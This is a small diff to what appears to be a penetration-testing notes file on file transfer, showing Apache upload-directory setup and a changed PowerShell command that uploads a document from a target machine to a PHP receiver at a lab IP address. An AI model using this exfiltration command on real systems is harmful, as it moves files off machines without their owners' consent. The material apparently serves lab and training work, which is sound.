@@ -31,7 +31,7 @@ move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
 sudo mkdir /var/www/uploads
 ps -ef | grep apache
 sudo chown www-data: /var/www/uploads
-powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'important.docx')
+powershell (New-Object System.Net.WebClient).UploadFile('http://10.11.0.4/upload.php', 'Path/important.docx')
 ```
 
 ### SCP Copy file from remote machine to local tmp
